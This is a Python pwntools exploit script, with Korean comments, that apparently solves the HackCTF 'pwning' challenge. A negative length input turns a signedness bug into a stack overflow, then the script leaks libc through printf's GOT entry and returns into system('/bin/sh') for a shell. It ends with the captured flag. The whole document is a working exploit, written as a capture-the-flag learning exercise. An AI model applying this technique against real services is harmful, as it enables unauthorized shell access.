#! -*_coding: utf-8 -*-
from pwn import *
elf = ELF("./pwning")

state = 1 # 0 on local, other on remote

if state == 0 : 
	log.info("run on locally")
	p = process("./pwning")
else :
	log.info("run on remotely")
	p = remote("ctf.j0n9hyun.xyz",3019)
	
# 프로그램을 시작하면, 몇바이트를 입력받을지 물어본 다음 해당 바이트만큼 입력을 받는다.
# 이때 특정 수 이상 입력시 너무 크다면서 프로그램이 종료되는데, 디버깅을 통해
# 해당 숫자가 얼만지 확인해보면 0x20, 32바이트이다. 
# 이떄 입력받는 위치와 ret 를 비교해보면 0xffffd0cc , 0xffffd09 => 0x30, 48바이트 차이가 난다.
# 음, 정상적인 루틴으로는 오버플로우 발생이 어렵다. 
# 입력을 받을때 get_n 함수를 사용하는데, 
# 공백이 들어가거나 개행문자를 만날때까지 반복하면서 문자열을 한글자씩 입력받고 길이를 잰다.
# 길이를 입력받는 get_n은 최대 4글자까지만 입력을 받는 모양. 
# 이때 , 음수값을 입력하면 atoi 에 의해 16진수상 음수로 바뀌어 들어가는데
# get_n 함수 내부구문에서는 이 값을 음수로 인식하지 않는 모양이라 엄청 큰 수를 넣어줄수 있게 된다. 
#  -100 을 넣으면 0xffffff9c 로 저장되어 해당 바이트만큼 입력받을려고 한다. 
# 함수의 libc가 주어져 있지 않으니, rop로 접근하자. 필요한 가젯들을 모아보자. 
# 가젯도 다 주어져있는게 아니었다. ret 시점에서 레지스터를 확인, 어떤게 필요한지 확실하게 보자.
# 가젯 만으로는 안되보임... 일단 leak을 해보자. 
# libc database 를 이용해 leak한 주소가지고 offset을 찾아가는식으로 풀어볼까?
# /find printf 0xf7dda020
# libc 버전이 libc6-i386_2.23-0ubuntu10_amd64 인걸 찾았다. 
#  ./dump libc6-i386_2.23-0ubuntu10_amd64 printf 로 오프셋도 찾자. 

p_ebx = 0x0804835d # pop ebx ; ret
d_ecx = 0x080485ed # dec ecx ; ret
pf_plt = 0x8048370
pf_got = 0x804a00c

if state == 0 : 
	pf_offset = 0x50B60		#on local
	bin_offset = 0x17B8CF	
	system_offset = 0x3cd10
else : 
	pf_offset = 0x49020		#./dump libc6-i386_2.23-0ubuntu10_amd64 printf 
	bin_offset = 0x15902b	#./dump libc6-i386_2.23-0ubuntu10_amd64 str_bin_sh
	system_offset = 0x3a940	#./dump libc6-i386_2.23-0ubuntu10_amd64 system

vuln =  0x0804852f




payload = "a"*48
payload += p32(pf_plt) + p32(vuln) + p32(pf_got)


p.sendlineafter("read? ","-100")
p.sendlineafter("data!",payload)

p.recvline()
p.recvline()

rcv = u32(p.recv(4))

pause()

libc = rcv - pf_offset
log.info("libc : "+hex(rcv))

system = libc+system_offset
binsh = libc+bin_offset

payload2 = "a"*48
payload2 += p32(system) + "BBBB" + p32(binsh)

p.sendlineafter("read? ","-100")
p.sendlineafter("data!",payload2)


p.interactive()

# libc-database를 활용한 풀이 성공!
# HackCTF{b34u71ful_5un5h1n3_pwn1n6}